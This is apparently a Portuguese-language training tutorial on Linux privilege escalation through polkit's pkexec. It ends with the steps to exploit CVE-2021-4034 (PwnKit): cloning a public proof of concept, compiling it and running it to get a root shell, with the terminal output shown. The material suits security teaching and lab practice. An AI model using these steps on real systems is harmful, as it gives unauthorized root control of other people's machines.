**PolicyKit** (ou **polkit**) é um serviço de autorização em sistemas Linux que controla a comunicação entre o software do usuário e os componentes do sistema com base em permissões. Ele verifica se o software do usuário está autorizado a executar certas instruções e permite definir permissões padrão para cada usuário e aplicativo.

É possível configurar se uma operação deve ser permitida ou proibida e se a autorização deve ser como administrador ou com validade específica, seja limitada por processo, sessão, ou ilimitada. Autorizações também podem ser atribuídas individualmente a usuários e grupos.

O Polkit trabalha com dois grupos de arquivos.
1. ações/políticas ( `/usr/share/polkit-1/actions`)
2. regras ( `/usr/share/polkit-1/rules.d`)

O Polkit também tem regras `local authority` que podem ser usadas para definir ou remover permissões adicionais para usuários e grupos. Regras personalizadas podem ser colocadas no diretório `/etc/polkit-1/localauthority/50-local.d`com a extensão de arquivo `.pkla`.

O PolKit também vem com três programas adicionais:

- `pkexec`- executa um programa com os direitos de outro usuário ou com direitos de root
- `pkaction`- pode ser usado para exibir ações
- `pkcheck`- isso pode ser usado para verificar se um processo está autorizado para uma ação específica

A ferramenta mais interessante para nós, neste caso, é `pkexec`porque ela executa a mesma tarefa `sudo` e pode executar um programa com direitos de outro usuário ou root.

```shell-session
cry0l1t3@nix02:~$ # pkexec -u <user> <command>
cry0l1t3@nix02:~$ pkexec -u root id

uid=0(root) gid=0(root) groups=0(root)
```

Na ferramenta `pkexec`, foi encontrada a vulnerabilidade de corrupção de memória com o identificador [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034) , também conhecida como [Pwnkit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) e também leva à escalada de privilégios.

Essa vulnerabilidade também ficou oculta por mais de dez anos, e ninguém pode dizer precisamente quando foi descoberta e explorada. Finalmente, em novembro de 2021, essa vulnerabilidade foi publicada e corrigida dois meses depois.

Para explorar essa vulnerabilidade, precisamos baixar um [PoC](https://github.com/arthepsy/CVE-2021-4034) e compilá-lo no próprio sistema de destino ou em uma cópia que fizemos.

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git
cry0l1t3@nix02:~$ cd CVE-2021-4034
cry0l1t3@nix02:~$ gcc cve-2021-4034-poc.c -o poc
```

Depois de compilarmos o código, podemos executá-lo sem mais delongas. Após a execução, mudamos do shell padrão ( `sh`) para Bash ( `bash`) e verificamos os IDs do usuário.

```shell-session
cry0l1t3@nix02:~$ ./poc

# id

uid=0(root) gid=0(root) groups=0(root)
```
